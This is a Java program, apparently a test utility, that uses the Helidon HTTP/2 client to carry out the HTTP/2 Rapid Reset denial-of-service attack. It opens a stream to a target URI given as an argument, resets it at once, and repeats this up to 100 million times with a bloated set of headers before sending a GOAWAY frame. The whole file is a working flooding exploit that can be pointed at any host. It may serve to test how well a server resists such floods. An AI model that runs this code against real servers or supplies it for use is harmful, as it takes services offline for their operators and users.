package cz.kec.test.rapidreset;

import java.net.URI;
import java.util.List;

import io.helidon.common.buffers.BufferData;
import io.helidon.common.tls.Tls;
import io.helidon.http.HeaderValues;
import io.helidon.http.Method;
import io.helidon.http.WritableHeaders;
import io.helidon.http.http2.FlowControl;
import io.helidon.http.http2.Http2ConnectionWriter;
import io.helidon.http.http2.Http2ErrorCode;
import io.helidon.http.http2.Http2Flag;
import io.helidon.http.http2.Http2FrameData;
import io.helidon.http.http2.Http2GoAway;
import io.helidon.http.http2.Http2Headers;
import io.helidon.http.http2.Http2RstStream;
import io.helidon.http.http2.Http2Setting;
import io.helidon.http.http2.Http2Settings;
import io.helidon.http.http2.Http2Util;
import io.helidon.webclient.api.ClientUri;
import io.helidon.webclient.api.ConnectionKey;
import io.helidon.webclient.api.DefaultDnsResolver;
import io.helidon.webclient.api.Proxy;
import io.helidon.webclient.api.TcpClientConnection;
import io.helidon.webclient.api.WebClient;

public class Main {
    public static void main(String[] args) {
        WritableHeaders<?> headers = WritableHeaders.create();
        for (int i = 0; i < 50; i++) {
            headers.add(HeaderValues.create("test".repeat(5) + i, (i + "val").repeat(5)));
        }

        URI uri = null;
        long numberOfRequests = 0;
        try {
            uri = URI.create(args.length >= 1 ? args[0] : "http://localhost:8080");
            numberOfRequests = args.length == 2 ? Long.parseLong(args[1]) : 100_000_000;
            if (args.length > 2) {
                throw new IllegalArgumentException("Wrong number of arguments");
            }
        } catch (NullPointerException | IllegalArgumentException e) {
            System.out.println(e.getMessage()
                                       + "\nUsage: rapid-reset [uri [number-of-requests]] "
                                       + "\nExample: rapid-reset https://localhost:8080 100000000"
            );
            System.exit(1);
        }

        ClientUri clientUri = ClientUri.create(uri);
        ConnectionKey connectionKey = new ConnectionKey(clientUri.scheme(),
                                                        clientUri.host(),
                                                        clientUri.port(),
                                                        Tls.builder().enabled(false).build(),
                                                        DefaultDnsResolver.create(),
                                                        null,
                                                        Proxy.noProxy());

        System.out.println("Sending " + numberOfRequests + " requests to " + uri.toASCIIString());

        TcpClientConnection conn = TcpClientConnection.create(WebClient.builder()
                                                                      .baseUri(clientUri)
                                                                      .build(),
                                                              connectionKey,
                                                              List.of(),
                                                              connection -> false,
                                                              connection -> {
                                                              })
                .connect();

        BufferData prefaceData = Http2Util.prefaceData();
        conn.writer().writeNow(prefaceData);
        Http2ConnectionWriter dataWriter = new Http2ConnectionWriter(conn.helidonSocket(), conn.writer(), List.of());

        Http2Settings http2Settings = Http2Settings.builder()
                .add(Http2Setting.INITIAL_WINDOW_SIZE, 65535L)
                .add(Http2Setting.MAX_FRAME_SIZE, 16384L)
                .add(Http2Setting.ENABLE_PUSH, false)
                .build();
        Http2Flag.SettingsFlags flags = Http2Flag.SettingsFlags.create(0);
        Http2FrameData frameData = http2Settings.toFrameData(null, 0, flags);
        dataWriter.write(frameData);

        for (int streamId = 1; streamId < (numberOfRequests * 2); streamId += 2) {

            if (streamId % 100_000 == 1) {
                System.out.println("Sending ... streamId " + streamId);
            }

            Http2Headers h2Headers = Http2Headers.create(headers);
            h2Headers.method(Method.GET);
            h2Headers.path(clientUri.path().path());
            h2Headers.scheme(clientUri.scheme());

            try {
                dataWriter.writeHeaders(h2Headers,
                                        streamId,
                                        Http2Flag.HeaderFlags.create(Http2Flag.END_OF_HEADERS),
                                        FlowControl.Outbound.NOOP);
                Http2RstStream rst = new Http2RstStream(Http2ErrorCode.NO_ERROR);
                dataWriter.writeData(rst.toFrameData(http2Settings, streamId, Http2Flag.NoFlags.create()),
                                     FlowControl.Outbound.NOOP);

            } catch (Exception e) {
                System.out.println("Failed when sending streamId: " + streamId);
                throw e;
            }
        }

        System.out.println("Sent everything!");

        Http2GoAway http2GoAway = new Http2GoAway(100000001, Http2ErrorCode.NO_ERROR, "RIP!");
        dataWriter.write(http2GoAway.toFrameData(http2Settings, 0, Http2Flag.NoFlags.create()));
        conn.closeResource();
    }
}
